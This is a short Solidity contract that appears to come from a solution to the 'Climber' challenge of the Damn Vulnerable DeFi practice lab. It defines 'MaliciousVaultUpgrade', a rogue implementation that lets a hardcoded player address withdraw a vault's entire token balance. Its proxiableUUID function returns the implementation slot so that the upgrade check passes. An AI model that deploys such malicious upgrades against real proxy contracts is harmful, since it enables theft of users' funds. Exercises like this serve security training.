// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {console} from "forge-std/Console.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// This contract is no upgradable anymore
contract MaliciousVaultUpgrade {

    // Hardcoded address of the player, could be done better
    function withdrawAll(address token) external {
        if (msg.sender != 0x44E97aF4418b7a17AABD8090bEA0A471a366305C) {
            revert("Only the owner can withdraw");
        }
        IERC20(token).transfer(
            msg.sender,
            IERC20(token).balanceOf(address(this))
        );
    }

    // Disable security check for upgradability
    function proxiableUUID() public pure returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}
